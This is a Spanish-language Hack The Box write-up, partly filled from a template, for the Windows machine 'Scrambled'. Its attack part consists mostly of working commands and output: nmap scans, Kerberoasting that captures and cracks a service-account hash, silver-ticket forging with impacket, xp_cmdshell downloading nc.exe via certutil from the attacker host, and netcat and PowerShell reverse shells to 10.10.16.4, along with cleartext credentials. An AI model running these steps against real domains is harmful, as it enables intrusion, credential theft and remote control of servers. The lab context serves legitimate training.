# Scrambled

## Tabla de Contenido <!-- omit from toc -->

- [Scrambled](#scrambled)
  - [Introducción](#introducción)
    - [Técnicas vistas / Tags](#técnicas-vistas--tags)
    - [Estadísticas](#estadísticas)
  - [Reconocimiento](#reconocimiento)
    - [Escaneo de host](#escaneo-de-host)
      - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
      - [Escaneo específico](#escaneo-específico)
  - [Enumeración](#enumeración)
    - [Servicios](#servicios)
      - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)
        - [Manual](#manual)
        - [Nombre de herramienta](#nombre-de-herramienta)
  - [Explotación](#explotación)
    - [Tipo de explotación](#tipo-de-explotación)
      - [Pasos previos | Preparación](#pasos-previos--preparación)
      - [Ejecución](#ejecución)
  - [Post Explotación](#post-explotación)
    - [Enumeración](#enumeración-1)
    - [Escalación de privilegios](#escalación-de-privilegios)
  - [Conclusión](#conclusión)
  - [Notas adicionales](#notas-adicionales)
  - [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Kerberoasting - NTLM Disabled
- Técnica 2
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Scrambled]() |
| OS | Windows |
| Dificultad oficial | Medium |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 30 |
| Creadores | [VbScrub](https://www.hackthebox.com/home/users/profile/158833) |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-10 09:31 EDT
Initiating SYN Stealth Scan at 09:31
Scanning 10.10.11.168 [65535 ports]
Discovered open port 139/tcp on 10.10.11.168
Discovered open port 135/tcp on 10.10.11.168
Discovered open port 445/tcp on 10.10.11.168
Discovered open port 53/tcp on 10.10.11.168
Discovered open port 80/tcp on 10.10.11.168
SYN Stealth Scan Timing: About 8.74% done; ETC: 09:37 (0:05:24 remaining)
Discovered open port 51036/tcp on 10.10.11.168
Discovered open port 389/tcp on 10.10.11.168
Discovered open port 4411/tcp on 10.10.11.168
SYN Stealth Scan Timing: About 34.29% done; ETC: 09:34 (0:01:57 remaining)
Discovered open port 3269/tcp on 10.10.11.168
Discovered open port 49708/tcp on 10.10.11.168
Discovered open port 1433/tcp on 10.10.11.168
Discovered open port 49667/tcp on 10.10.11.168
Discovered open port 464/tcp on 10.10.11.168
Discovered open port 5985/tcp on 10.10.11.168
Discovered open port 593/tcp on 10.10.11.168
SYN Stealth Scan Timing: About 67.47% done; ETC: 09:33 (0:00:44 remaining)
Discovered open port 49673/tcp on 10.10.11.168
Discovered open port 9389/tcp on 10.10.11.168
Discovered open port 88/tcp on 10.10.11.168
Discovered open port 49702/tcp on 10.10.11.168
Discovered open port 49674/tcp on 10.10.11.168
Discovered open port 3268/tcp on 10.10.11.168
Discovered open port 636/tcp on 10.10.11.168
Completed SYN Stealth Scan at 09:33, 116.81s elapsed (65535 total ports)
Nmap scan report for 10.10.11.168
Host is up (0.075s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49702/tcp open  unknown
49708/tcp open  unknown
51036/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 116.92 seconds
           Raw packets sent: 131127 (5.770MB) | Rcvd: 158 (9.460KB)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49702,49708,51036 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-10 09:36 EDT
Nmap scan report for 10.10.11.168
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-10 13:36:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:39:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:39:47+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-05-10T13:24:40
|_Not valid after:  2053-05-10T13:24:40
|_ssl-date: 2023-05-10T13:39:47+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:39:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-10T13:39:47+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
51036/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=5/10%Time=645B9DE4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-05-10T13:39:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.47 seconds
```

## Enumeración

### Servicios

#### Nombre de servicio - Puerto

##### Manual



```bash
└─$ crackmapexec ldap scrm.local -u ksimpson -p '' -k --kdcHost dc1.scrm.local
LDAP        scrm.local      389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAP        scrm.local      389    DC1.scrm.local   [-] scrm.local\ksimpson: KDC_ERR_PREAUTH_FAILED

┌──(srrequiem㉿pwnchadnezzar)-[~/…/boxes/windows/medium/scrambled]
└─$ crackmapexec ldap scrm.local -u ksimpson -p ksimpson -k --kdcHost dc1.scrm.local
LDAP        scrm.local      389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAPS       scrm.local      636    DC1.scrm.local   [+] scrm.local\ksimpson
```

https://github.com/fortra/impacket/issues/1206

```python
def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
           target = self.__kdcHost
           #target = self.getMachineName()  <-- old line 260 code that we're no longer running
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

```

```bash
└─$ impacket-GetUserSPNs 'scrm.local/ksimpson:ksimpson' -k -dc-ip dc1.scrm.local -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$d4bdfa128dab148dd05f6722b535193c$acc52922770acff5a8fa1db9b7886e1d423dfd775fff6c4af67bf3922b94f998c3e5730a6ce11ddd9540a9c14f89bd7e21bd4dbdb5d07e61dec5f4af3bbeda095905a76ddd9b0baa14cf43cdc631f04b3d4fc1871b399f4ebc192458bbdd390d4490fc88ba8ca0c7c2f14e00b7c9c3c036b1ad8599ae8261a2af47b035c8f0550b80894ad60f4f7cb447073cd0367ead1832320b7b956d8e4557f46f09642a4d2f4aca64af98e6f0f1e1ecc73984671d9fd599bc288dab9e6ba9216d4d79d7cec8b200d6e611db715bf1067c1dbacb3d4b337985b32464566d7d00f6ce2ab379d653450fbb8901f10219c08f83cb088313ebafa191b20d180f813afd210dc45e13385f162d7c67eebfd9316c167446d2fdcf3e37560e0381d3cae35a9d0aa9eb1a8fc1549356abe6692afc7a80f7ba80b87f6c953be36e28aa740f9a58e077b45c4b2899069be933a948561edcdda37a2dd001196de990870c360635144124dc846d508eb7415bda558c64b6384d32588054ffca22c39e39616e9354b958028dc72614347c7a0e504a3942e48a12221c4e69461bdfaa911d734834717c2d0e9368306b60b9adc5d0ef3affbd4b3f0337b858e90f4fc1c7c921bd899140f55dee9fc3bb4d82f5ccc10acace57cda5c1b268d8772a2275649677b9df60cd5a346cefe1498d6602d25056b203e39468522787537eacfb2daf3b40a6e02cd1a8ded3dd8253d7af3443064fa9c0a7a7c86ecabb9653a45adf2c76a6779fa71be1763c3b0d915dc941d3bc531446d2a22b6403bab2cd15713a9ed9e4a41efb097e59273be4541927b4f6784d7ba6af0269e1671e69ecdad4f43f5251b8774fb101614ee6a63836e6fe5efaa1416ba5e719a67e2e9e04b811bf2a3173232c4061ae3031522ecb32ba332d42328041f074d19c2fc3eec1c30c5ed1654d7b57785cc3d0aa831d0f4d3fc614415c20b7fff3b96a68ab4919e358ac1cde7c390e7953d90893ae4ca13d1861cac073a18727f19dc976494d2a6bf19adc1f749529b74ae46b0831cccce1b32b9f2c387bd7fdbc55909aa640ebf37fd236e6252926560dbc900f9fc327e3d6d38a75c2e15722ebfcb6555d6d21c1fcff6f4abd83143be781983b76289c612b06a80e50a1e552259af484bc5d06784862bf69c2eda73463776d6c4bb5272c21ff6c49eb184eacbdf3f26503a950e3b7258f56909663edc4823c618a2878b19ed3b6e1cf6e7eaeb95686aaa6d9b7bbd87a9a6174706978c925ad3a87272082de71aa0dde562ac2ec3e273c6742ff7303e3e6a331f80d963e6d88e98620305cc6aecb2e49bade9c26f359528b9a0238d6d54dbd110eb90b38f2ba6b79a7ba824af8d96d755d3c927726923ee9fb86a8437a471adabc0ca85aeeda5274a6fa0bcc70e4949c2fbae80b82cc4348825e4db5e54eb76e2ba7
```

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt sqlsvc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)
1g 0:00:00:04 DONE (2023-05-11 10:32) 0.2500g/s 2682Kp/s 2682Kc/s 2682KC/s Penrose..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
└─$ impacket-mssqlclient -k -dc-ip 10.10.11.168 'scrm.local/sqlsvc:Pegasus60@dc1.scrm.local'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] CCache file is not found. Skipping...
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.

┌──(srrequiem㉿pwnchadnezzar)-[~/…/windows/medium/scrambled/content]
└─$ impacket-mssqlclient -k -dc-ip 10.10.11.168 'scrm.local/MSSQLSvc:Pegasus60@dc1.scrm.local'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```bash
└─$ impacket-getPac 'scrm.local/ksimpson:ksimpson' -targetUser ksimpson
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

KERB_VALIDATION_INFO
LogonTime:
    dwLowDateTime:                   3857835436
    dwHighDateTime:                  31032346
LogoffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
KickOffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
PasswordLastSet:
    dwLowDateTime:                   1006366732
    dwHighDateTime:                  30920979
PasswordCanChange:
    dwLowDateTime:                   1717940236
    dwHighDateTime:                  30921180
PasswordMustChange:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
EffectiveName:                   'ksimpson'
FullName:                        'Karen Simpson'
LogonScript:                     ''
ProfilePath:                     ''
HomeDirectory:                   ''
HomeDirectoryDrive:              ''
LogonCount:                      121
BadPasswordCount:                0
UserId:                          1619
PrimaryGroupId:                  513
GroupCount:                      1
GroupIds:
    [

        RelativeId:                      513
        Attributes:                      7 ,
    ]
UserFlags:                       32
UserSessionKey:
    Data:                            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
LogonServer:                     'DC1'
LogonDomainName:                 'SCRM'
LogonDomainId:
    Revision:                        1
    SubAuthorityCount:               4
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05'
    SubAuthority:
        [
             21,
             2743207045,
             1827831105,
             2542523200,
        ]
LMKey:                           b'\x00\x00\x00\x00\x00\x00\x00\x00'
UserAccountControl:              528
SubAuthStatus:                   0
LastSuccessfulILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
LastFailedILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
FailedILogonCount:               0
Reserved3:                       0
SidCount:                        1
ExtraSids:
    [

        Sid:
            Revision:                        1
            SubAuthorityCount:               1
            IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x12'
            SubAuthority:
                [
                     2,
                ]
        Attributes:                      7 ,
    ]
ResourceGroupDomainSid:          NULL
ResourceGroupCount:              0
ResourceGroupIds:                NULL
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

 0000   10 00 00 00 03 B7 27 3F  3F AB 04 80 64 74 91 0B   ......'??...dt..
```


ntlm B999A16500B87D17EC7F2E2A68778F05 spn MSSQLSvc/dc1.scrm.local sid S-1-5-21-2743207045-1827831105-2542523200

```bash
└─$ impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -user Administrator -domain scrm.local -dc-ip dc1.scrm.local  Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

```bash
└─$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k dc1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL> exec xp_cmdshell 'certutil.exe -f -urlcache -split http://10.10.16.4/nc.exe c:\windows\temp\nc.exe'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

****  Online  ****
  0000  ...                                                                                                                                   
  e800
CertUtil: -URLCache command completed successfully.

NULL

SQL> exec xp_cmdshell 'c:\windows\temp\nc.exe -e cmd.exe 10.10.16.4 1234'
```

```powershell
$userName = 'scrm.local\MiscSvc'
$userPassword = 'ScrambledEggs9900'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

Invoke-Command -ComputerName DC1 -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.4 4321}

Start-Process -FilePath 'C:\Windows\Temp\nc.exe' -argumentlist "-e cmd.exe 10.10.16.4 4321" -Credential $credObject

```

##### Nombre de herramienta



## Explotación

### Tipo de explotación

#### Pasos previos | Preparación



#### Ejecución



## Post Explotación

### Enumeración



### Escalación de privilegios


## Conclusión


## Notas adicionales


## Referencias

